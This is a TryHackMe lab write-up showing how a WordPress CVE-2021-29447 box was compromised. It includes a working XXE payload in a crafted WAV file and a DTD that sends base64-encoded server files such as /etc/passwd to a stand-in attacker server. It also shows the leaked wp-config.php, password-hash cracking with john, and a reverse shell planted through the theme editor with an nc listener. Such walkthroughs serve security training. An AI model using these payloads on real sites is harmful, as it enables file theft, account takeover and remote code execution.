---
title: wordpressCVE-2021-29447(EASY)|TryHackMe
date: 2025-11-04
categories:
  - Writeups
  - TryHackMe
tags:
  - thm
  - linux
  - wordpress
---
#### SUMMARY

This  wordpress machine is vulnerable to an XXE vulnerability which can give authenticated users the ability to disclose server files arbitrarily. Also this vulnerability could be leveraged to perform an SSRF attack, meaning HTTP requests could be made on behalf of the WordPress installation. Depending on the environment, this can have a serious impact.
#### **RECON**

Right from the machine description  I got credentials 
`tes-corp:test`

navigated to the `wp-admin` login page and logged in as the test-corp user.

Understanding and using the payload from the page
```
echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://YOURSEVERIP:PORT/poc.dtd'"'"'>%remote;%init;%trick;]>\x00' > payload.wav

```

I created a `poc.dtd` file which included a payload indicating the file I want to read from the system.
```
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">   <!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://YOURSERVERIP:PORT/?p=%file;'>" >
```

I tried using a python server and it worked for a while , I could get the base64  encoded chars for the /etc/passwd but I tried so hard for the `wp-config.php` file which has the path  `/var/www/html/wp-config.php` but didnt work so I used PHP server.

I set my php server 
```
php -S 0.0.0.0:1337
```

And got the config file 
```
<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/support/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'REDACTED' );

/** MySQL database username */
define( 'DB_USER', 'REDACTED' );

/** MySQL database password */
define( 'DB_PASSWORD', 'REDACTED' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define( 'AUTH_KEY',         'put your unique phrase here' );
define( 'SECURE_AUTH_KEY',  'put your unique phrase here' );
define( 'LOGGED_IN_KEY',    'put your unique phrase here' );
define( 'NONCE_KEY',        'put your unique phrase here' );
define( 'AUTH_SALT',        'put your unique phrase here' );
define( 'SECURE_AUTH_SALT', 'put your unique phrase here' );
define( 'LOGGED_IN_SALT',   'put your unique phrase here' );
define( 'NONCE_SALT',       'put your unique phrase here' );

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix = 'wptry_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 *
 * @link https://wordpress.org/support/article/debugging-in-wordpress/
 */
define( 'WP_DEBUG', false );

/* That's all, stop editing! Happy publishing. */
define('WP_HOME', false);
define('WP_SITEURL', false);

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
	define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';
```

Having the database credentials and knowing it is MYSQL database , I probed port `3306` with nmap and it was open. Not something I would advice you to do in production though.

I tried accessing it , but because on my kali I use the Maria DB client , I used the command below to connect to the database  
```
mysql -h 10.10.1.116 -u <username> -p --ssl=false <Databasename>
```
I got access to the databse and got the password hash of the super admin user.
I used john to crak it 
```
echo 'hashhere' > hash.txt
```

```
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

Got the password for that user and logged in again through the `wp-admin` login portal.

#### FOOTHOLD

To get the foothold , I edited one of the themes .php files by navigating to 


`appearance> theme > select theme> edit a .php file with rev shell payload > save modification> go back to the themes page , click live preview.`


make sure you set your listener 
```
nc -lvnp 1337
```
Since there is only one user on the server , you get to read the flag from his home directory .
NO privileged escalation required.